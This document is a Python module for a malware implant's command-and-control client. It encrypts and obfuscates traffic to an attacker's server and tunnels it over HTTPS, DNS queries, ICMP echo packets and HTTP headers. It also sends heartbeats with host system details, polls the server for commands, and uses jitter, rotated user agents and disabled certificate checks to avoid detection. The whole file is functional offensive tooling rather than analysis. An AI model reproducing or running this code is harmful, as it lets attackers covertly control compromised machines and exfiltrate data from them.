# Encrypted C2 Communication Module
# Implements advanced encryption and covert channels for C2 communication

import requests
import json
import time
import random
import base64
import hashlib
import hmac
import urllib.parse
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import dns.resolver
import struct
from config import (
    C2_SERVER, C2_USER_AGENT, C2_TIMEOUT, C2_MAX_RETRIES,
    RETRY_DELAY_MIN, RETRY_DELAY_MAX, DEBUG_MODE, AGENT_API_KEY
)
from core.stealth import stealth_manager

class EncryptedC2Client:
    """Enhanced C2 client with multiple encryption layers and covert channels"""
    
    def __init__(self, server_url=None, encryption_key=None, session_id=None):
        self.server_url = server_url or C2_SERVER
        self.session_id = session_id or self._generate_session_id()
        self.encryption_key = encryption_key or self._derive_encryption_key()
        self.fernet = Fernet(self.encryption_key)
        self.session = self._create_session()
        self.dns_c2_enabled = True
        self.domain_fronting_enabled = True
        
    def _generate_session_id(self):
        """Generate cryptographically secure session ID"""
        import secrets
        return secrets.token_hex(16)
    
    def _derive_encryption_key(self, password=None):
        """Derive encryption key using PBKDF2"""
        password = password or (AGENT_API_KEY + self.session_id).encode()
        salt = hashlib.sha256(self.session_id.encode()).digest()
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return base64.urlsafe_b64encode(kdf.derive(password))
    
    def _create_session(self):
        """Create HTTP session with advanced headers"""
        session = requests.Session()
        session.verify = False
        
        # Rotate user agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
            'X-Agent-Key': AGENT_API_KEY
        })
        
        return session
    
    def encrypt_data(self, data):
        """Encrypt data with multiple layers"""
        try:
            # Convert to JSON if not already string
            if not isinstance(data, str):
                data = json.dumps(data)
            
            # First layer: Fernet encryption
            encrypted = self.fernet.encrypt(data.encode())
            
            # Second layer: Base64 encoding with obfuscation
            encoded = base64.b64encode(encrypted).decode()
            
            # Third layer: Simple XOR obfuscation
            obfuscated = self._xor_obfuscate(encoded)
            
            return obfuscated
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Encryption failed: {e}")
                )
            return None
    
    def decrypt_data(self, encrypted_data):
        """Decrypt multi-layer encrypted data"""
        try:
            # Reverse the obfuscation layers
            deobfuscated = self._xor_obfuscate(encrypted_data)
            decoded = base64.b64decode(deobfuscated)
            decrypted = self.fernet.decrypt(decoded)
            
            return json.loads(decrypted.decode())
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Decryption failed: {e}")
                )
            return None
    
    def _xor_obfuscate(self, data, key=None):
        """XOR obfuscation layer"""
        if key is None:
            key = hashlib.md5(self.session_id.encode()).digest()
        
        data_bytes = data.encode() if isinstance(data, str) else data
        obfuscated = bytearray()
        
        for i, byte in enumerate(data_bytes):
            obfuscated.append(byte ^ key[i % len(key)])
        
        return base64.b64encode(obfuscated).decode()
    
    def send_data_encrypted(self, data, endpoint="/data"):
        """Send encrypted data to C2 server"""
        try:
            # Encrypt the payload
            encrypted_payload = self.encrypt_data({
                'sessionId': self.session_id,
                'timestamp': time.time(),
                'data': data
            })
            
            if not encrypted_payload:
                return False
            
            # Add jitter for stealth
            stealth_manager.add_jitter()
            
            # Prepare covert payload
            covert_data = self._prepare_covert_payload(encrypted_payload)
            
            # Try multiple communication channels
            for attempt in range(C2_MAX_RETRIES):
                try:
                    # Primary HTTPS channel
                    response = self._send_https_channel(covert_data, endpoint)
                    if response:
                        return self._process_response(response)
                    
                    # Fallback DNS channel
                    if self.dns_c2_enabled and attempt >= 1:
                        response = self._send_dns_channel(covert_data)
                        if response:
                            return self._process_response(response)
                    
                    # Exponential backoff
                    if attempt < C2_MAX_RETRIES - 1:
                        delay = random.uniform(
                            RETRY_DELAY_MIN * (2 ** attempt),
                            RETRY_DELAY_MAX * (2 ** attempt)
                        )
                        time.sleep(delay)
                        
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Channel attempt {attempt + 1} failed: {e}")
                        )
                    continue
            
            return False
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Encrypted send failed: {e}")
                )
            return False
    
    def _prepare_covert_payload(self, encrypted_data):
        """Prepare payload for covert transmission"""
        # Split data into chunks for covert channels
        chunk_size = 200  # DNS TXT record limit
        
        chunks = []
        for i in range(0, len(encrypted_data), chunk_size):
            chunk = encrypted_data[i:i + chunk_size]
            chunks.append({
                'chunk_id': i // chunk_size,
                'total_chunks': (len(encrypted_data) + chunk_size - 1) // chunk_size,
                'data': chunk
            })
        
        return chunks
    
    def _send_https_channel(self, covert_data, endpoint):
        """Send data via HTTPS with domain fronting"""
        try:
            # Reconstruct data from chunks
            if isinstance(covert_data, list):
                data = ''.join(chunk['data'] for chunk in covert_data)
            else:
                data = covert_data
            
            # Prepare payload with steganography
            payload = {
                'data': data,
                'checksum': hashlib.sha256(data.encode()).hexdigest()[:16]
            }
            
            response = self.session.post(
                f"{self.server_url}{endpoint}",
                json=payload,
                timeout=C2_TIMEOUT
            )
            
            if response.status_code == 200:
                return response.json()
            
        except Exception:
            pass
        
        return None
    
    def _send_dns_channel(self, covert_data):
        """Send data via DNS TXT records"""
        try:
            domain = self.server_url.split('//')[-1].split('/')[0]
            
            for chunk in covert_data:
                # Encode chunk data as subdomain
                subdomain = f"{chunk['chunk_id']}.{chunk['total_chunks']}.{chunk['data'][:50]}"
                
                try:
                    # Query for TXT record
                    answers = dns.resolver.resolve(f"{subdomain}.{domain}", 'TXT')
                    for answer in answers:
                        return str(answer).strip('"')
                        
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                    continue
                except Exception:
                    continue
            
        except Exception:
            pass
        
        return None
    
    def _process_response(self, response):
        """Process and decrypt C2 response"""
        try:
            if isinstance(response, str):
                # DNS channel response
                decrypted = self.decrypt_data(response)
            else:
                # HTTPS channel response
                if 'encrypted_data' in response:
                    decrypted = self.decrypt_data(response['encrypted_data'])
                else:
                    decrypted = response
            
            return decrypted
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Response processing failed: {e}")
                )
            return None
    
    def receive_commands_encrypted(self, endpoint="/commands"):
        """Receive encrypted commands from C2"""
        try:
            stealth_manager.add_jitter()
            
            response = self.session.get(
                f"{self.server_url}{endpoint}",
                params={'sessionId': self.session_id},
                timeout=C2_TIMEOUT
            )
            
            if response.status_code == 200:
                if response.content:
                    decrypted = self.decrypt_data(response.json().get('encrypted_data', ''))
                    return decrypted
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Command reception failed: {e}")
                )
        
        return None
    
    def heartbeat(self):
        """Send encrypted heartbeat to C2"""
        heartbeat_data = {
            'type': 'heartbeat',
            'timestamp': time.time(),
            'status': 'active',
            'system_info': self._get_system_info()
        }
        
        return self.send_data_encrypted(heartbeat_data, "/heartbeat")
    
    def _get_system_info(self):
        """Collect minimal system info for heartbeat"""
        try:
            import platform
            import psutil
            
            return {
                'os': platform.system(),
                'arch': platform.machine(),
                'cpu_count': psutil.cpu_count(),
                'memory_gb': round(psutil.virtual_memory().total / (1024**3), 1)
            }
        except Exception:
            return {'os': 'unknown', 'arch': 'unknown'}

class CovertChannelManager:
    """Manages multiple covert communication channels"""
    
    def __init__(self, c2_client):
        self.c2_client = c2_client
        self.channels = {
            'https': self._https_channel,
            'dns': self._dns_channel,
            'icmp': self._icmp_channel,
            'http_headers': self._http_headers_channel
        }
        self.active_channels = ['https', 'dns']
    
    def send_via_channels(self, data):
        """Send data through multiple channels for redundancy"""
        results = {}
        
        for channel in self.active_channels:
            try:
                if channel in self.channels:
                    result = self.channels[channel](data)
                    results[channel] = result
            except Exception as e:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"Channel {channel} failed: {e}")
                    )
                results[channel] = False
        
        return results
    
    def _https_channel(self, data):
        """Primary HTTPS channel"""
        return self.c2_client.send_data_encrypted(data)
    
    def _dns_channel(self, data):
        """DNS tunneling channel"""
        return self.c2_client._send_dns_channel(
            self.c2_client._prepare_covert_payload(
                self.c2_client.encrypt_data(data)
            )
        )
    
    def _icmp_channel(self, data):
        """ICMP tunneling channel for covert communication"""
        try:
            import socket
            import struct
            import random
            
            # Prepare data for ICMP transmission
            encoded_data = self.c2_client.encrypt_data(data)
            if not encoded_data:
                return False
            
            # Split data into chunks (ICMP payload limit is typically 65507 bytes)
            chunk_size = 1000  # Conservative chunk size
            chunks = [
                encoded_data[i:i + chunk_size] 
                for i in range(0, len(encoded_data), chunk_size)
            ]
            
            # Create raw ICMP socket (requires root/admin privileges)
            try:
                sock = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)
                sock.settimeout(C2_TIMEOUT)
                
                # Use destination from server URL
                dest_addr = self.c2_client.server_url.split('//')[-1].split('/')[0]
                
                for i, chunk in enumerate(chunks):
                    # Build ICMP echo request packet
                    icmp_type = 8  # Echo request
                    icmp_code = 0
                    icmp_id = struct.pack('!H', random.randint(1, 65535))
                    icmp_seq = struct.pack('!H', i)
                    
                    # Create payload with chunk data
                    payload = f"{i}|{len(chunks)}|{chunk}".encode()
                    
                    # Calculate checksum
                    checksum = 0
                    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, 
                                         int.from_bytes(icmp_id, 'big'), 
                                         int.from_bytes(icmp_seq, 'big'))
                    packet = header + payload
                    
                    # Calculate proper checksum
                    checksum = self._icmp_checksum(packet)
                    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum,
                                         int.from_bytes(icmp_id, 'big'),
                                         int.from_bytes(icmp_seq, 'big'))
                    packet = header + payload
                    
                    # Send ICMP packet
                    sock.sendto(packet, (dest_addr, 0))
                    
                    # Add jitter between chunks
                    stealth_manager.add_jitter(0.1, 0.5)
                
                sock.close()
                return True
                
            except (socket.error, OSError):
                # ICMP requires elevated privileges, fall back silently
                return False
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"ICMP channel failed: {e}")
                )
            return False
    
    def _icmp_checksum(self, data):
        """Calculate ICMP checksum"""
        checksum = 0
        length = len(data)
        
        # Handle odd-length data
        if length % 2 == 1:
            data += b'\x00'
        
        # Sum all 16-bit values
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        # Handle carry
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def _http_headers_channel(self, data):
        """HTTP header-based covert channel"""
        try:
            encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
            
            headers = {
                'X-Custom-Header': encoded_data[:100],
                'X-Request-ID': encoded_data[100:200] if len(encoded_data) > 100 else '',
                'X-Session-ID': self.c2_client.session_id
            }
            
            response = self.c2_client.session.get(
                self.c2_client.server_url,
                headers=headers,
                timeout=C2_TIMEOUT
            )
            
            return response.status_code == 200
            
        except Exception:
            return False

# Global encrypted C2 client instance
encrypted_c2_client = EncryptedC2Client()
covert_channel_manager = CovertChannelManager(encrypted_c2_client)
